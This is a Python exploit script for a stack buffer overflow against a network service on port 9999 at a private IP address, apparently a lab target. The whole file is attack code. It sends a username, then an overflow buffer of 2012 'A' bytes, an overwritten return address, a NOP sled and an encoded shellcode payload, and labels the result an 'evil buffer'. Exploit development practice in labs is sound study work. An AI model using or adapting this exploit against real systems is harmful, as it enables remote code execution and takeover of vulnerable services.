import socket
import sys

ip = "172.20.192.1"
port = 9999
timeout = 5

offset = 2012
overflow = "A" * offset
retn = "\x0f\x15\x50\x62"
padding = "\x90"*32
payload = ("\xdb\xc3\xbf\x6f\x9c\xd6\xb8\xd9\x74\x24\xf4\x5d\x31\xc9"
"\xb1\x52\x31\x7d\x17\x03\x7d\x17\x83\x82\x60\x34\x4d\xa0"
"\x71\x3b\xae\x58\x82\x5c\x26\xbd\xb3\x5c\x5c\xb6\xe4\x6c"
"\x16\x9a\x08\x06\x7a\x0e\x9a\x6a\x53\x21\x2b\xc0\x85\x0c"
"\xac\x79\xf5\x0f\x2e\x80\x2a\xef\x0f\x4b\x3f\xee\x48\xb6"
"\xb2\xa2\x01\xbc\x61\x52\x25\x88\xb9\xd9\x75\x1c\xba\x3e"
"\xcd\x1f\xeb\x91\x45\x46\x2b\x10\x89\xf2\x62\x0a\xce\x3f"
"\x3c\xa1\x24\xcb\xbf\x63\x75\x34\x13\x4a\xb9\xc7\x6d\x8b"
"\x7e\x38\x18\xe5\x7c\xc5\x1b\x32\xfe\x11\xa9\xa0\x58\xd1"
"\x09\x0c\x58\x36\xcf\xc7\x56\xf3\x9b\x8f\x7a\x02\x4f\xa4"
"\x87\x8f\x6e\x6a\x0e\xcb\x54\xae\x4a\x8f\xf5\xf7\x36\x7e"
"\x09\xe7\x98\xdf\xaf\x6c\x34\x0b\xc2\x2f\x51\xf8\xef\xcf"
"\xa1\x96\x78\xbc\x93\x39\xd3\x2a\x98\xb2\xfd\xad\xdf\xe8"
"\xba\x21\x1e\x13\xbb\x68\xe5\x47\xeb\x02\xcc\xe7\x60\xd2"
"\xf1\x3d\x26\x82\x5d\xee\x87\x72\x1e\x5e\x60\x98\x91\x81"
"\x90\xa3\x7b\xaa\x3b\x5e\xec\x79\xaf\xa6\x82\xe9\xd2\x26"
"\x4a\xb6\x5b\xc0\x06\x56\x0a\x5b\xbf\xcf\x17\x17\x5e\x0f"
"\x82\x52\x60\x9b\x21\xa3\x2f\x6c\x4f\xb7\xd8\x9c\x1a\xe5"
"\x4f\xa2\xb0\x81\x0c\x31\x5f\x51\x5a\x2a\xc8\x06\x0b\x9c"
"\x01\xc2\xa1\x87\xbb\xf0\x3b\x51\x83\xb0\xe7\xa2\x0a\x39"
"\x65\x9e\x28\x29\xb3\x1f\x75\x1d\x6b\x76\x23\xcb\xcd\x20"
"\x85\xa5\x87\x9f\x4f\x21\x51\xec\x4f\x37\x5e\x39\x26\xd7"
"\xef\x94\x7f\xe8\xc0\x70\x88\x91\x3c\xe1\x77\x48\x85\x01"
"\x9a\x58\xf0\xa9\x03\x09\xb9\xb7\xb3\xe4\xfe\xc1\x37\x0c"
"\x7f\x36\x27\x65\x7a\x72\xef\x96\xf6\xeb\x9a\x98\xa5\x0c"
"\x8f")

buffer = overflow + retn + padding + payload
username = "user"

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        
        # Receive initial server output (welcome + username prompt)
        initial = s.recv(1024)
        print(f"Server (initial): {initial.decode('latin-1', errors='replace')}")
        
        s.sendall(bytes(username + "\n", "latin-1"))  # Send username
        
        # Receive message prompt
        message_prompt = s.recv(1024)
        print(f"Server (message prompt): {message_prompt.decode('latin-1', errors='replace')}")
        
        print(f"Sending evil buffer of {len(buffer)} bytes...")
        s.sendall(bytes(buffer + "\n", "latin-1"))  # Send buffer as message
        
        # Receive server response
        response = s.recv(1024)
        print(f"Server (response): {response.decode('latin-1', errors='replace')}")
        print("Done!")
except Exception as e:
    print("Could not connect or server crashed.")
    print(f"Exception: {e}")
